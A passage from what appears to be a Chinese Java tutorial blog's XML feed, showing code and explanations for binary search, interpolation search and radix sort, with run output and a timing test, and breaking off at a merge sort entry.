class="line">resIndexlist.add(mid);</span><br><span class="line">temp = mid + <span class="number">1</span>;<span class="comment">//从mid向右遍历查找相同数</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp &gt; arr.length - <span class="number">1</span> || arr[temp] != value) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">resIndexlist.add(temp);</span><br><span class="line">temp++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> resIndexlist;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="非递归实现代码"><a href="#非递归实现代码" class="headerlink" title="非递归实现代码"></a>非递归实现代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.binarysearchnorecursion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinarySearchNoRecursion</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">67</span>, <span class="number">100</span> &#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> binarySearch(arr, <span class="number">100</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;index=&quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> target)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (arr[mid] == target) &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; target) &#123;</span><br><span class="line">right = mid - <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &lt; target) &#123;</span><br><span class="line">left = mid + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="插值查找"><a href="#插值查找" class="headerlink" title="插值查找"></a>插值查找</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>插值查找算法类似于二分查找，也需要记录是<strong>有序</strong>的，不同的是插值查找每次从<strong>自适应</strong>mid处开始查找。<br>将二分查找求中间记录的mid 索引公式改成：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200804200714.png"></p><p>key：要查找的值；low：第一个记录在数组中的索引值；high：最后一个记录在数组中的索引值</p><p><strong>(key-a[low]) &#x2F; (a[high]-a[low])就是查找值在这个均匀分布的有序序列中的大致位置的系数</strong></p><p>对应的代码公式为：</p><p><code>int mid = left + (right - left) * (value - arr[left]) / (arr[right] - arr[left]);</code></p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.search;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsertValueSearch</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">1</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">89</span>, <span class="number">1000</span>, <span class="number">1234</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> insertValueSearch(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;index = &quot;</span> + index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">insertValueSearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> value)</span> &#123;</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;插值查找次数~~&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：value &lt; arr[0] 和 value &gt; arr[arr.length - 1] 必须需要</span></span><br><span class="line"><span class="comment">// 否则我们得到的 mid 可能越界</span></span><br><span class="line"><span class="keyword">if</span> (left &gt; right || value &lt; arr[<span class="number">0</span>] || value &gt; arr[arr.length - <span class="number">1</span>]) &#123;</span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求出mid, 自适应</span></span><br><span class="line"><span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) * (value - arr[left]) / (arr[right] - arr[left]);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">midValue</span> <span class="operator">=</span> arr[mid];</span><br><span class="line"><span class="keyword">if</span> (value &gt; midValue) &#123; </span><br><span class="line"><span class="keyword">return</span> insertValueSearch(arr, mid + <span class="number">1</span>, right, value);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &lt; midValue) &#123;</span><br><span class="line"><span class="keyword">return</span> insertValueSearch(arr, left, mid - <span class="number">1</span>, value);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>对于数据量较大，关键字分布比较均匀的查找表来说，采用插值查找， 速度较快</li><li>关键字分布不均匀的情况下，该方法不一定比折半查找要好</li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性查找 </tag>
            
            <tag> 二分查找 </tag>
            
            <tag> 插值查找 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基数排序</title>
      <link href="/posts/bd8f/"/>
      <url>/posts/bd8f/</url>
      
        <content type="html"><![CDATA[<h1 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><ol><li>基数排序（radix sort）属于“分配式排序”（distribution sort），又称“桶子法”（bucket sort）或bin sort，顾名思义，它是通过键值的各个位的值，将要排序的元素分配至某些“桶”中，达到排序的作用。</li><li>基数排序法是属于稳定性的排序，基数排序法的是效率高的稳定性排序法。</li><li>基数排序(Radix Sort)是桶排序的扩展。</li><li>基数排序是1887年赫尔曼·何乐礼发明的。它是这样实现的：将整数按位数切割成不同的数字，然后按每个位数分别比较。</li></ol></blockquote><h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p>首先定义10个<strong>“桶”</strong>，下标为0~9；然后遍历数组，按照元素的<strong>“个位”</strong>数值，依次放入对应下标的桶中，放完所有元素后，从第0个桶开始遍历，依次取出桶中元素按顺序放入原始数组中；同理，之后再遍历数组，按照元素的<strong>“十位”</strong>数值，做上一步相同的操作；以此类推，直到按照数组中最大元素的最高位操作完为止。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215707.png"><br><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215708.png"><br><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215709.png"></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadixSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">53</span>, <span class="number">3</span>, <span class="number">542</span>, <span class="number">748</span>, <span class="number">14</span>, <span class="number">214</span> &#125;;</span><br><span class="line">radixSort(arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 二维数组包含10个一维数组,表示10个桶, 每个桶就是一个一维数组</span></span><br><span class="line"><span class="comment">// 2. 为了防止在放入数的时候，数据溢出，则每个一维数组(桶)，大小定为arr.length</span></span><br><span class="line"><span class="comment">// 3. 基数排序是使用空间换时间的经典算法</span></span><br><span class="line"><span class="type">int</span>[][] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line"><span class="comment">// 为了记录每个桶中实际存放了多少个数据,我们定义一个一维数组来记录各个桶的每次放入的数据个数</span></span><br><span class="line"><span class="comment">// 比如：bucketElementCounts[0] , 记录的就是 bucket[0] 桶的放入数据个数</span></span><br><span class="line"><span class="type">int</span>[] bucketElementCounts = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第1轮(针对每个元素的个位进行排序处理)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;<span class="comment">//按照位数放入对应的桶中</span></span><br><span class="line"><span class="type">int</span> <span class="variable">digitOfElement</span> <span class="operator">=</span> arr[i] / <span class="number">1</span> % <span class="number">10</span>;<span class="comment">//获得个位数</span></span><br><span class="line">bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[i];</span><br><span class="line">bucketElementCounts[digitOfElement]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//遍历每一个桶，并将桶中的数据，放入到原数组中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketElementCounts.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (bucketElementCounts[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketElementCounts[i]; j++) &#123;</span><br><span class="line">arr[index++] = bucket[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bucketElementCounts[i] = <span class="number">0</span>;<span class="comment">//清零，方便下一轮使用</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第1轮，对个位的排序处理 arr =&quot;</span> + Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">digitOfElement</span> <span class="operator">=</span> arr[i] / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[i];</span><br><span class="line">bucketElementCounts[digitOfElement]++;</span><br><span class="line">&#125;</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketElementCounts.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (bucketElementCounts[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketElementCounts[i]; j++) &#123;</span><br><span class="line">arr[index++] = bucket[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bucketElementCounts[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第2轮，对十位的排序处理 arr =&quot;</span> + Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">digitOfElement</span> <span class="operator">=</span> arr[i] / <span class="number">100</span> % <span class="number">10</span>;</span><br><span class="line">bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[i];</span><br><span class="line">bucketElementCounts[digitOfElement]++;</span><br><span class="line">&#125;</span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketElementCounts.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (bucketElementCounts[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketElementCounts[i]; j++) &#123;</span><br><span class="line">arr[index++] = bucket[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bucketElementCounts[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;第3轮，对百位的排序处理 arr =&quot;</span> + Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>第1轮，对个位的排序处理 arr &#x3D;[542, 53, 3, 14, 214, 748]<br>第2轮，对十位的排序处理 arr &#x3D;[3, 14, 214, 542, 748, 53]<br>第3轮，对百位的排序处理 arr &#x3D;[3, 14, 53, 214, 542, 748]</p><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadixSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> arr[] = &#123; <span class="number">53</span>, <span class="number">3</span>, <span class="number">542</span>, <span class="number">748</span>, <span class="number">14</span>, <span class="number">214</span> &#125;;</span><br><span class="line">radixSort(arr);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span>[][] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line"><span class="type">int</span>[] bucketElementCounts = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取最大数有多少位</span></span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (max &lt; arr[i]) &#123;</span><br><span class="line">max = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> (max + <span class="string">&quot;&quot;</span>).length();</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">1</span>; k &lt; maxLength; k++, n *= <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">digitOfElement</span> <span class="operator">=</span> arr[i] / n % <span class="number">10</span>;</span><br><span class="line">bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[i];</span><br><span class="line">bucketElementCounts[digitOfElement]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketElementCounts.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (bucketElementCounts[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketElementCounts[i]; j++) &#123;</span><br><span class="line">arr[index++] = bucket[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bucketElementCounts[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试基数排序的速度"><a href="#测试基数排序的速度" class="headerlink" title="测试基数排序的速度"></a>测试基数排序的速度</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.sort;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadixSort</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;;</span><br><span class="line"><span class="comment">// 创建要给8000000个的随机的数组，八百万</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">8000000</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8000000</span>; i++) &#123;</span><br><span class="line">arr[i] = (<span class="type">int</span>) (Math.random() * <span class="number">8000000</span>); <span class="comment">// 生成一个[0, 8000000) 数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">date1Str</span> <span class="operator">=</span> simpleDateFormat.format(data1);</span><br><span class="line">System.out.println(<span class="string">&quot;排序前的时间是=&quot;</span> + date1Str);</span><br><span class="line"></span><br><span class="line">radixSort(arr);</span><br><span class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span>[][] bucket = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][arr.length];</span><br><span class="line"><span class="type">int</span>[] bucketElementCounts = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取最大数有多少位</span></span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (max &lt; arr[i]) &#123;</span><br><span class="line">max = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> (max + <span class="string">&quot;&quot;</span>).length();</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">1</span>; k &lt; maxLength; k++, n *= <span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">digitOfElement</span> <span class="operator">=</span> arr[i] / n % <span class="number">10</span>;</span><br><span class="line">bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[i];</span><br><span class="line">bucketElementCounts[digitOfElement]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketElementCounts.length; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (bucketElementCounts[i] != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; bucketElementCounts[i]; j++) &#123;</span><br><span class="line">arr[index++] = bucket[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">bucketElementCounts[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-08-03 21:35:10 排序后的时间是=2020-08-03 21:35:11</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基数排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>归并排序</title>
      <link href="/posts/f8df/"/>
      <url>/posts/f8df/</url>
      
